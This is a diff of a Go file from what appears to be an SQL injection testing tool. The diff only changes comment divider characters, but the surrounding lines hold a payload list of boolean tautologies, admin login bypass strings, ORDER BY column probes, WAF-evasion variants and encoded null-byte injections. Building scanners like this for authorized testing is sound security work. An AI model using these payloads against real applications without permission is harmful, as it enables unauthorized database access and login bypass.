@@ -3,9 +3,9 @@ package payloads
 var Bypasser = PayloadGroup{
 	DBMS: "Bypasser",
 	Payloads: []Payload{
-		// ═══════════════════════════════════════════
+		// ===========================================
 		// BLIND INJECTION BYPASS
-		// ═══════════════════════════════════════════
+		// ===========================================
 		{Type: "boolean", Content: "'%20or%20'1'='1"},
 		{Type: "boolean", Content: "admin'--"},
 		{Type: "boolean", Content: "admin' #"},
@@ -14,9 +14,9 @@ var Bypasser = PayloadGroup{
 		{Type: "boolean", Content: "' or 1=1-- -"},
 		{Type: "boolean", Content: "' or 1=1--+"},
 
-		// ═══════════════════════════════════════════
+		// ===========================================
 		// ORDER BY / GROUP BY / UNION DETECTION
-		// ═══════════════════════════════════════════
+		// ===========================================
 		{Type: "boolean", Content: "1' ORDER BY 1--"},
 		{Type: "boolean", Content: "1' ORDER BY 2--"},
 		{Type: "boolean", Content: "1' ORDER BY 3--"},
@@ -34,9 +34,9 @@ var Bypasser = PayloadGroup{
 		{Type: "boolean", Content: "1' GROUP BY 2--"},
 		{Type: "boolean", Content: "1' GROUP BY 3--"},
 
-		// ═══════════════════════════════════════════
+		// ===========================================
 		// COMMENT INJECTION BYPASSES
-		// ═══════════════════════════════════════════
+		// ===========================================
 		{Type: "boolean", Content: "'--"},
 		{Type: "boolean", Content: "'#"},
 		{Type: "boolean", Content: "'/*"},
@@ -59,9 +59,9 @@ var Bypasser = PayloadGroup{
 		{Type: "boolean", Content: "' OR 1=1--+"},
 		{Type: "boolean", Content: "' OR 1=1 /*"},
 
-		// ═══════════════════════════════════════════
+		// ===========================================
 		// HTTP PARAMETER INJECTION
-		// ═══════════════════════════════════════════
+		// ===========================================
 		{Type: "boolean", Content: "'"},
 		{Type: "boolean", Content: "\""},
 		{Type: "boolean", Content: "\\'"},
@@ -74,9 +74,9 @@ var Bypasser = PayloadGroup{
 		{Type: "boolean", Content: "%2527"},
 		{Type: "boolean", Content: "%2522"},
 
-		// ═══════════════════════════════════════════
+		// ===========================================
 		// WAF SIGNATURE BYPASS
-		// ═══════════════════════════════════════════
+		// ===========================================
 		{Type: "boolean", Content: "' OR 1=1--"},
 		{Type: "boolean", Content: "' OR 2>1--"},
 		{Type: "boolean", Content: "' OR 1<2--"},
@@ -92,9 +92,9 @@ var Bypasser = PayloadGroup{
 		{Type: "boolean", Content: "' OR (1)=(1)--"},
 		{Type: "boolean", Content: "' OR 1=1 || '1'='1"},
 
-		// ═══════════════════════════════════════════
+		// ===========================================
 		// NULL BYTE & ENCODING BYPASS
-		// ═══════════════════════════════════════════
+		// ===========================================
 		{Type: "boolean", Content: "'%00OR%201=1--"},
 		{Type: "boolean", Content: "'%00AND%201=1--"},
 		{Type: "boolean", Content: "%27+OR+1%3D1--"},
